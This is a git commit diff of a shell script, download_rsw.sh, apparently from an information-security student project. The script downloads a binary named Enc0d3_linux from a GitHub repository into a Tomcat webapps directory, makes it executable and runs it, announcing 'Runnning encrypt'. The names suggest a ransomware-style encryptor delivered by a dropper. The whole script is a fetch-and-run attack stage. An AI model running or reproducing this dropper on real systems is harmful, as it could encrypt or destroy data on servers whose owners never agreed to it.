4da587be3b502120c7508b4e4a9e1508b8d255e0
Thân Hữu Tuấn <32167814+ThanHuuTuan@users.noreply.github.com>
2024-07-30 16:53:30 +0700

    Update download_rsw.sh

--- download_rsw.sh
+++ download_rsw.sh
@@ -3,31 +3,27 @@
 # Đặt thư mục đích
 DEST_DIR="/opt/tomcat/webapps"
 
-# Tạo thư mục nếu chưa tồn tại
-mkdir -p "$DEST_DIR"
-echo "Đã tạo thư mục: $DEST_DIR"
-
 # Tải file từ URL và lưu vào thư mục đích
-echo "Đang tải file từ URL..."
+echo "Downloading..."
 wget -O "$DEST_DIR/Enc0d3_linux" https://github.com/ThanHuuTuan/DT_ATTT_VR/raw/main/Enc0d3_linux
 
 if [ $? -eq 0 ]; then
-    echo "Tải file thành công."
+    echo "success download."
 else
-    echo "Lỗi khi tải file." >&2
+    echo "fail download." >&2
     exit 1
 fi
 
 # Đặt quyền thực thi cho file đã tải
 chmod +x "$DEST_DIR/Enc0d3_linux"
-echo "Đã đặt quyền thực thi cho file."
+echo "change excute permisson file."
 
 # Chạy file
-echo "Đang chạy file..."
+echo "Runnning encrypt.."
 "$DEST_DIR/Enc0d3_linux"
 
 if [ $? -eq 0 ]; then
-    echo "Chạy file thành công."
+    echo "Runiing success."
 else
     echo "Lỗi khi chạy file." >&2
     exit 1
